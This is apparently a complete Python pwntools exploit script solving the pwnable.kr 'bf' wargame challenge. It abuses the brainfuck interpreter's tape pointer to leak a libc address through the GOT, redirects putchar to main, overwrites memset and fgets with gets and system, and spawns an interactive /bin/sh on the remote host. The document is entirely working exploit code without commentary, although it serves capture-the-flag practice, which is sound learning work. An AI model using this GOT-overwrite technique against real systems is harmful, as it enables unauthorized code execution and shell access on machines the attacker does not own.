#!/usr/bin/env python3

import pwn
from time import sleep

io = pwn.remote('pwnable.kr', 9001)
elf = pwn.ELF('./bf')
libc = pwn.ELF('./bf_libc.so')

io.recvuntil('[ ]\n')

def write_data(num):
	global now
	now += num
	return b',>' * num

def read_data(num):
	global now
	now += num
	return b'.>' * num

def shift_left(num):
	global now
	now -= num
	return b'<' * num

def shift_right(num):
	global now
	now += num
	return b'>' * num

now = elf.sym[b'tape']

"""
1. leak libc address
2. change putchar to main
"""
payload = b''
payload += shift_left(now - elf.got[b'setvbuf'])
payload += read_data(4)
payload += shift_right(elf.got[b'putchar'] - now)
payload += write_data(4)
payload += b'.'

io.sendline(payload)
sleep(1)
io.send(pwn.p32(elf.sym[b'main']))

get = io.recv(4)
setvbuf_addr = pwn.u32(get)
libc_addr = setvbuf_addr - libc.sym[b'setvbuf']

"""
overwrite: memset ->  gets
           fgets  ->  system
"""

io.recvuntil('[ ]\n')
now = elf.sym[b'tape']

payload = b''
payload += shift_left(now - elf.got[b'memset'])
payload += write_data(4)
payload += shift_left(now - elf.got[b'fgets'])
payload += write_data(4)
payload += b'.'

gets_addr = libc_addr + libc.sym[b'gets']
system_addr = libc_addr + libc.sym[b'system']

io.sendline(payload)
sleep(1)
io.send(pwn.p32(gets_addr) + pwn.p32(system_addr))
sleep(1)
io.sendline('/bin/sh')

io.interactive()
